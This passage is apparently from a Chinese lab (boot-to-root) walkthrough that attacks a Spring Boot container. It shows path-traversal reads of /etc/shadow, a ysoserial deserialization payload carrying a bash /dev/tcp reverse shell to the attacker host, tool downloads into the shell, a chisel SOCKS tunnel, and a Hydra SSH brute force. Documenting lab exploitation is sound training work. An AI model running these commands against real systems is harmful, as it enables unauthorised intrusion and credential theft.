postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
</code></pre>
<p>可以任意文件读取，但是发现好像没几个用户</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../etc/shadow" -H "Cookie:auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI="
root:!::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
postgres:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
                                    
</code></pre>
<p>看到这就有点怀疑是docker了</p>
<p>因为前面nuclei扫描的时候看到可能是springboot，所以关注一下Java</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../../proc/self/cmdline" -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=" -o cmdline
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    40    0    40    0     0   8188      0 --:--:-- --:--:-- --:--:-- 10000
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat cmdline                                                                 
java-jarjavaserver-0.0.1-SNAPSHOT.jar                                           
</code></pre>
<p>假设路径是app/java-jarjavaserver-0.0.1-SNAPSHOT.jar</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar" -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI="
../../../../app/java-jarjavaserver-0.0.1-SNAPSHOT.jar                          
</code></pre>
<p>啊这，那我不猜了</p>
<p>Linux 的 /proc 文件，可以查看<strong>当前工作目录</strong></p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=../../../../proc/self/cwd" -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI="
../../../../proc/self/cwd                                                       
</code></pre>
<p>啊这，那继续猜吧</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl "http://192.168.205.131:8080/download?file=javaserver-0.0.1-SNAPSHOT.jar" -H "Cookie: auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=" -o app.jar &amp;&amp; ls -l app.jar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 16.5M    0 16.5M    0     0  12.9M      0 --:--:--  0:00:01 --:--:-- 12.9M
-rwxr-xr-x 1 kali kali 17372545  6月27日 08:51 app.jar
                                                       
</code></pre>
<p>（要不去买个彩票，哈哈哈）</p>
<h3>3.3 Java反序列化漏洞利用</h3>
<p>拿jd-gui看看</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ jd-gui app.jar

</code></pre>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2e48ec28ad582dcd7c21813a180af0275454a2b6e89c27ba63c17bdebaed3e44/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230353334313934312e77656270"><img src="https://camo.githubusercontent.com/2e48ec28ad582dcd7c21813a180af0275454a2b6e89c27ba63c17bdebaed3e44/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230353334313934312e77656270" alt="image-20250627205341588" data-canonical-src="https://7r1umphk.github.io/image/20250627205341941.webp" style="max-width: 100%;"></a></p>
<p>没东西，但是<strong>VulnController.class</strong></p>
<pre class="notranslate"><code class="notranslate">// ...
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
// ...

@PostMapping({"/deserialize"})
public String deserialize(@RequestBody byte[] data, HttpServletRequest request) {
    if (!isLoggedIn(request)) // 检查是否已登录
        return "&lt;h2&gt;Error: Unauthorized access";
    try {
        // 危险操作：直接从请求体中读取数据并反序列化
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        Object obj = ois.readObject();
        ois.close();
        return "Deserialized: " + obj.toString();
    } catch (Exception e) {
        return "Error: " + e.getMessage();
    }
}
</code></pre>
<p>看他的处理方法......有点像打<strong>反序列化</strong></p>
<blockquote>
<p>Java反序列化漏洞</p>
<p>应用接收了来自用户的序列化数据，并在没有进行安全检查的情况下调用 <code class="notranslate">ObjectInputStream.readObject()</code> 将其还原为Java对象。如果应用的classpath中存在某些被称为“gadget”的特殊类，攻击者就可以构造恶意的序列化数据。当这些数据被反序列化时，会触发gadget类中的方法，最终导致任意代码执行（RCE）。</p>
</blockquote>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/52677b1ead70e05faefda513a40175101f751d82153980e2494fde2d0a9adc94/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230353632333539392e77656270"><img src="https://camo.githubusercontent.com/52677b1ead70e05faefda513a40175101f751d82153980e2494fde2d0a9adc94/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632373230353632333539392e77656270" alt="image-20250627205623427" data-canonical-src="https://7r1umphk.github.io/image/20250627205623599.webp" style="max-width: 100%;"></a></p>
<p>ok，没事了，就是打反序列化</p>
<p>commons-collections-3.2.1.jar这个库，如果了解的话，就知道可以被 ysoserial 工具利用</p>
<p>url:/deserialize</p>
<p>请求方法：POST</p>
<p>if (!isLoggedIn(request)) 必须携带有效的 Cookie</p>
<p>new ObjectInputStream(new ByteArrayInputStream(data));和 ois.readObject();打开房门让你进，不做任何检查，非常的教科书</p>
<p>那拿一下吧</p>
<p>Kali监听一下</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
</code></pre>
<p>使用 ysoserial生成反弹 Shell payload</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar 
--2025-06-27 20:21:29--  https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
正在解析主机 github.com (github.com)... 224.0.0.1
正在连接 github.com (github.com)|224.0.0.1|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 302 Found
位置：https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar [跟随至新的 URL]
--2025-06-27 20:21:32--  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
再次使用存在的到 github.com:443 的连接。
已发出 HTTP 请求，正在等待回应... 302 Found
位置：https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250628T002132Z&amp;X-Amz-Expires=1800&amp;X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&amp;X-Amz-SignedHeaders=host&amp;response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&amp;response-content-type=application%2Foctet-stream [跟随至新的 URL]
--2025-06-27 20:21:32--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/29955458/bb6518d9-ffb7-4437-8b6f-db3659467c5c?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20250628%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250628T002132Z&amp;X-Amz-Expires=1800&amp;X-Amz-Signature=6f7e3edd576cb88052588bac5ba19eef49326f73e6dbe5802b878c1f9e6ec3f3&amp;X-Amz-SignedHeaders=host&amp;response-content-disposition=attachment%3B%20filename%3Dysoserial-all.jar&amp;response-content-type=application%2Foctet-stream
正在解析主机 objects.githubusercontent.com (objects.githubusercontent.com)... 224.0.0.2
正在连接 objects.githubusercontent.com (objects.githubusercontent.com)|224.0.0.2|:443... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：59525376 (57M) [application/octet-stream]
正在保存至: “ysoserial-all.jar”

ysoserial-all.jar                            100%[============================================================================================&gt;]  56.77M  17.2MB/s  用时 3.9s    

2025-06-27 20:21:39 (14.6 MB/s) - 已保存 “ysoserial-all.jar” [59525376/59525376])

                                                               
</code></pre>
<p>生成 payload（可能你的java会有问题，去下载一个Java 8版本的就好了）</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo -n 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNS4xMjgvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" &gt; payload.bin
</code></pre>
<p>尝试</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/deserialize" -X POST --cookie "auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=" --data-binary @payload.bin                   
{"timestamp":"2025-06-27T13:34:01.451+0000","status":404,"error":"Not Found","message":"No message available","path":"/deserialize"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/deserialize" -X POST --cookie "auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=" --data-binary @payload.bin -H "Content-Type:"
{"timestamp":"2025-06-27T13:34:11.493+0000","status":404,"error":"Not Found","message":"No message available","path":"/deserialize"}                   
</code></pre>
<p>弹回来了</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
</code></pre>
<h2>四、横向移动：Docker逃逸与内网穿透</h2>
<p>瞄了一下，并且根据之前下载靶机的体量推测是个alpine，所以不稳定shell了</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-4.4# ls -la
ls -la
total 16976
drwxr-xr-x    1 root     root          4096 Jun 16 18:16 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
-rw-r--r--    1 root     root      17372545 Jun 16 17:46 javaserver-0.0.1-SNAPSHOT.jar
bash-4.4# cd ..
cd ..
bash-4.4# ls -al
ls -al
total 80
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
-rwxr-xr-x    1 root     root             0 Jun 24 04:20 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 16 18:16 app
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 bin
drwxr-xr-x    5 root     root           320 Jun 27 08:43 dev
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 etc
drwxr-xr-x    2 root     root          4096 May  9  2019 home
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 lib
drwxr-xr-x    5 root     root          4096 May  9  2019 media
drwxr-xr-x    2 root     root          4096 May  9  2019 mnt
drwxr-xr-x    2 root     root          4096 May  9  2019 opt
dr-xr-xr-x  217 root     root             0 Jun 27 08:43 proc
drwx------    1 root     root          4096 Jun 27 13:28 root
drwxr-xr-x    2 root     root          4096 May  9  2019 run
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 sbin
drwxr-xr-x    2 root     root          4096 May  9  2019 srv
dr-xr-xr-x   13 root     root             0 Jun 27 08:43 sys
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 tmp
drwxr-xr-x    1 root     root          4096 May 11  2019 usr
drwxr-xr-x    1 root     root          4096 May  9  2019 var
bash-4.4# cd opt
cd opt
bash-4.4# ls -al
ls -al
total 8
drwxr-xr-x    2 root     root          4096 May  9  2019 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
bash-4.4# cd /tmp
cd /tmp
bash-4.4# ls -al
ls -al
total 100
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root
-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned
drwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080
drwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080
drwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080
drwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080
drwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080
drwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080
drwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080
drwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080
drwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080
drwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080
ls -al
total 100
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root
-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned
drwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080
drwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080
drwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080
drwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080
drwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080
drwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080
drwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080
drwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080
drwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080
drwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080
bash-4.4# cd hsperfdata_root
cd hsperfdata_root
bash-4.4# ls -al
ls -al
total 40
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 .
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 ..
-rw-------    1 root     root         32768 Jun 27 13:37 1
</code></pre>
<p>hsperfdata_root是java的日志没啥营养，因为我们就是通过这个进来的</p>
<pre class="notranslate"><code class="notranslate">bash-4.4# ip a
ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
</code></pre>
<h3>4.1 内网探测</h3>
<p>是个docker，拉个fscan来扫描网段</p>
<p>kali开服务</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 -m http.server 80                                                                                                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

</code></pre>
<p>拉</p>
<pre class="notranslate"><code class="notranslate">bash-4.4# cd /tmp
cd /tmp
bash-4.4# wget 192.168.205.128/fscan
wget 192.168.205.128/fscan
Connecting to 192.168.205.128 (192.168.205.128:80)
fscan                100% |********************************| 6933k  0:00:00 ETA

bash-4.4# chmod +x fscan
chmod +x fscan
bash-4.4# ./fscan -h 172.17.0.1/16
./fscan -h 172.17.0.1/16

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.17.0.1      is alive
(icmp) Target 172.17.0.2      is alive
(icmp) Target 172.17.0.3      is alive
[*] LiveTop 172.17.0.0/16    段存活数量为: 3
[*] LiveTop 172.17.0.0/24    段存活数量为: 3
[*] Icmp alive hosts len is: 3
172.17.0.3:8080 open
172.17.0.1:8080 open
172.17.0.2:22 open
172.17.0.2:80 open
172.17.0.1:80 open
172.17.0.1:22 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle http://172.17.0.1         code:200 len:6048   title:Linux Terminal Simulator
[*] WebTitle http://172.17.0.2         code:200 len:2808   title:暴力破解技术讲解
[*] WebTitle http://172.17.0.3:8080    code:302 len:0      title:None 跳转url: http://172.17.0.3:8080/login.html
[*] WebTitle http://172.17.0.1:8080    code:302 len:0      title:None 跳转url: http://172.17.0.1:8080/login.html
[*] WebTitle http://172.17.0.3:8080/login.html code:200 len:2377   title:用户登录
[*] WebTitle http://172.17.0.1:8080/login.html code:200 len:2377   title:用户登录
已完成 6/6
[*] 扫描结束,耗时: 9.823162079s
</code></pre>
<p>172.17.0.1 宿主机 80 8080 22</p>
<p>172.17.0.2 80 22 docker2</p>
<p>17.17.0.3 本机</p>
<p>那先看看.2，80是啥</p>
<pre class="notranslate"><code class="notranslate">bash-4.4# curl 172.17.0.2
curl 172.17.0.2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0&lt;!DOCTYPE html&gt;
&lt;html lang="zh"&gt;
&lt;head&gt;
  &lt;meta charset="UTF-8"&gt;
  &lt;title&gt;暴力破解技术讲解&lt;/title&gt;
  &lt;style&gt;
    body {
      font-family: "Microsoft YaHei", sans-serif;
      background: #f5f7fa;
      color: #333;
      margin: 0;
      padding: 0;
    }

    header {
      background-color: #2c3e50;
      color: white;
      padding: 20px;
      text-align: center;
    }

    main {
      max-width: 800px;
      margin: 30px auto;
      padding: 20px;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
    }

    h2 {
      color: #2c3e50;
      border-bottom: 2px solid #ecf0f1;
      padding-bottom: 5px;
    }

    ul {
      margin-left: 20px;
    }

    code {
      background: #ecf0f1;
      padding: 2px 5px;
      border-radius: 4px;
    }

    footer {
      text-align: center;
      padding: 15px;
      color: #888;
      font-size: 14px;
    }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;header&gt;
    &lt;h1&gt;暴力破解技术讲解&lt;/h1&gt;
  &lt;/header&gt;

  &lt;main&gt;
    &lt;h2&gt;什么是暴力破解？&lt;/h2&gt;
    &lt;p&gt;暴力破解（Brute Force Attack）是一种穷举法攻击方式，攻击者通过尝试所有可能的密码组合，直到找到正确的密码为止。&lt;/p&gt;

    &lt;h2&gt;常见的暴力破解类型&lt;/h2&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;纯暴力破解&lt;/strong&gt;：从 &lt;code&gt;aaaa&lt;/code&gt; 到 &lt;code&gt;zzzz&lt;/code&gt; 逐个尝试所有组合。&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;字典攻击&lt;/strong&gt;：使用预设的常用密码列表进行尝试。&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;混合攻击&lt;/strong&gt;：结合字典词和常见变化（如添加123，大小写变换等）。&lt;/li&gt;
    &lt;/ul&gt;

    &lt;h2&gt;暴力破解的特点&lt;/h2&gt;
    &lt;ul&gt;
      &lt;li&gt;不依赖漏洞，仅依靠尝试。&lt;/li&gt;
      &lt;li&gt;耗时高，复杂度随密码长度和字符集呈指数增长。&lt;/li&gt;
      &lt;li&gt;可以被自动化脚本执行（如使用 Python、Hydra、John the Ripper 等）。&lt;/li&gt;
    &lt;/ul&gt;

    &lt;h2&gt;防御暴力破解的方法&lt;/h2&gt;
    &lt;ul&gt;
      &lt;li&gt;设置&lt;strong&gt;账户锁定&lt;/strong&gt;策略，例如连续错误5次后锁定。&lt;/li&gt;
      &lt;li&gt;加入&lt;strong&gt;验证码&lt;/strong&gt;，阻止自动化脚本。&lt;/li&gt;
      &lt;li&gt;限制&lt;strong&gt;登录速率&lt;/strong&gt;，如 5 分钟内最多尝试 3 次。&lt;/li&gt;
      &lt;li&gt;使用&lt;strong&gt;强密码&lt;/strong&gt;（长且复杂的密码）。&lt;/li&gt;
      &lt;li&gt;监控登录行为，检测异常登录尝试。&lt;/li&gt;
    &lt;/ul&gt;

    &lt;h2&gt;合法用途与警告&lt;/h2&gt;
    &lt;p&gt;暴力破解技术可以用于渗透测试和安全审计，但在未经授权的情况下使用属于违法行为。请务必遵守相关法律法规。&lt;/p&gt;
100  2808  100  2808    0     0  2742k      0 --:--:-- --:--:-- --:--:-- 2742k
/main&gt;
  &lt;!--500-worst-passwords--&gt;
  &lt;footer&gt;
    &amp;copy; 2025 网络安全教学页面 | 仅供学习交流
  &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>告诉我们暴力破解，并且给了字典500-worst-passwords</p>
<p>网上扒拉了一下</p>
<p><a href="https://gist.github.com/djaiss/4033452">https://gist.github.com/djaiss/4033452</a></p>
<p>下载下来，然后扒拉一个chisel过来</p>
<h3>4.2 内网穿透与SSH爆破</h3>
<pre class="notranslate"><code class="notranslate">bash-4.4# wget 192.168.205.128/chisel
wget 192.168.205.128/chisel
Connecting to 192.168.205.128 (192.168.205.128:80)
chisel               100% |********************************| 9152k  0:00:00 ETA

bash-4.4# chmod +x chisel
chmod +x chisel
</code></pre>
<p>kali开个监听</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ./chisel server -p 8081 --reverse
2025/06/27 20:52:53 server: Reverse tunnelling enabled
2025/06/27 20:52:53 server: Fingerprint noxPhEnuZCIYVPVU9OBwffbD6OdVDKc9jcSAUtCtbN0=
2025/06/27 20:52:53 server: Listening on http://0.0.0.0:8081
</code></pre>
<p>然后靶机docker</p>
<pre class="notranslate"><code class="notranslate">bash-4.4# ./chisel client 192.168.205.128:8081 R:socks
./chisel client 192.168.205.128:8081 R:socks
2025/06/27 13:51:26 client: Connecting to ws://192.168.205.128:8081
2025/06/27 13:51:26 client: Connected (Latency 698.603µs)
</code></pre>
<p>连上了，然后他默认是使用socks5代理socks5 127.0.0.1 1080 ，使用代理工具加上就好了</p>
<p>我这使用proxychains</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/proxychains4.conf
[sudo] kali 的密码：
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ proxychains -q ssh root@172.17.0.2                                                                 
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:nCuJTguX/ssJuWNmjLBVoZlUUv1Ygi4k0AFEgPORK5M.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
root@172.17.0.2's password: 
Permission denied, please try again.
root@172.17.0.2's password: 

</code></pre>
<p>hydra爆破</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ proxychains -q hydra -l root -P 500.txt ssh://172.17.0.2 -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 21:07:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 503 login tries (l:1/p:503), ~8 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: mountain
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-27 21:07:53
                                  
</code></pre>
<p>继续</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ proxychains -q ssh root@172.17.0.2                                            
root@172.17.0.2's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

6ab28be27b0c:~# ls -al
total 12
drwx------    1 root     root          4096 Jun 26 05:03 .
drwxr-xr-x    1 root     root          4096 Jun 24 17:57 ..
